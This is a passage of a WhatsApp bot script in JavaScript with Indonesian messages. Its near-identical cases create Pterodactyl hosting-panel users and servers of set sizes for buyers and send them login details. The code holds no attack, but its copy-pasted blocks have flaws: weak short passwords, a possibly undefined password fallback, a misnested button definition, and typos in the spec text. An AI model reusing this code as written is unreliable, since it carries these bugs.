"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 17075
│ • *DISK :* 17075
│ • *CPU :* 510%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break

case "18gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "18075"
let cpu = "540"
let disk = "18075"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 18075
│ • DISK : 18075
│ • CPU : 540%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 18075
│ • *DISK :* 18075
│ • *CPU :* 540%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break

case "19gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "19075"
let cpu = "570"
let disk = "19075"
let email = username + "@Rain.Hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 19075
│ • DISK : 19075
│ • CPU : 570%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 19075
│ • *DISK :* 19075
│ • *CPU :* 570%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break

case "20gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "20075"
let cpu = "600"
let disk = "20075"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 20075
│ • DISK : 20075
│ • CPU : 600%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 20075
│ • *DISK :* 20075
│ • *CPU :* 600%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break

case "21gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "21100"
let cpu = "630"
let disk = "21100"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 21100
│ • DISK : 21100
│ • CPU : 630%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 21100
│ • *DISK :* 2110p
│ • *CPU :* 630%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break

case "22gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "22100"
let cpu = "660"
let disk = "22100"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 22100
│ • DISK : 22100
│ • CPU : 660%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 22100
│ • *DISK :* 2210p
│ • *CPU :* 660%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break

case "23gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "23100"
let cpu = "690"
let disk = "23100"
let email = username + "@Rain.hosting"

if (!u) return
let d = (await nolan.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let deskripsi = `${penghitung}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`_Sedang Membuat Server..._`)
let ctf = `*Data panel dari ${global.ownername}* `+readmore+`
╭───────────────────
│『 *DATA PANEL ANDA* 』
├────
│ • *Username :* ${user.username}
│ • *Password :* ${password.toString()}
│ • *Server :* ${ownername}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
│ • RAM : 23100
│ • DISK : 23100
│ • CPU : 690%
├────
╰───────────────────
*Owner hanya mengirim data 1x*
*Jaga baik baik data panel anda*

*Login ke panel anda ss dengan caption*
*.done barang,jumlah*`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `Create By ${global.ownername}`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: false  
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "COPY PASSWORD",
"copy_code": `${password.toString()}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"NO OWNER","url":"${global.owner}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"GROUP BUYER","url":"${global.gcku}","merchant_url":"https://www.google.com"}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '1203633011767@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await nolan.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
╭───────────────────
│『 *DONE CREAT SERVER* 』
├────
│ • *ID User :* ${user.id}
│ • *ID Server :* ${server.id}
│ • *Create By :* ${pushname}
├───────────────────
│『 *SPESIFIKASI SERVER* 』
├────
│ • *RAM :* 23100
│ • *DISK :* 23100
│ • *CPU :* 690%
├────
╰───────────────────

Username dan Password Telah Dikirim
Ke Nomer Tersebut Bang ${pushname}`)

}
break

case "24gb": {
if (!isOwner && !isReseller) return m.reply('Fitur Khusus Owner!')  
let t = text.split(',');
if (t.length < 2) return m.reply(`*Contoh :* ${prefix+command} username,nomer`)
let username = t[0];
